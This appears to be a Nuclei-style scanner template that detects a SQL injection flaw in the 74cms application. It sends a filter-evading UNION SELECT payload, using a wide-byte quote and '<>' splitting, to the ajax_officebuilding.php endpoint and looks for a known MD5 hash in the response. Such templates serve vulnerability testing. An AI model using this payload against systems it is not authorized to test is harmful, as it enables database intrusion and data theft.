id: 74cms-sqli-2
info:
  name: 74cms SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Potential SQL injection vulnerability in the 74cms application.
    This template checks for SQL injection by injecting a payload and observing the MD5 hash of a random number in the response.
variables:
  rand: '{{rand_int(10000, 21000)}}'
http:
  - method: GET
    path:
      - '{{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{rand}}),5,6,7,8,9%23'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '{{md5(rand)}}'
        part: body
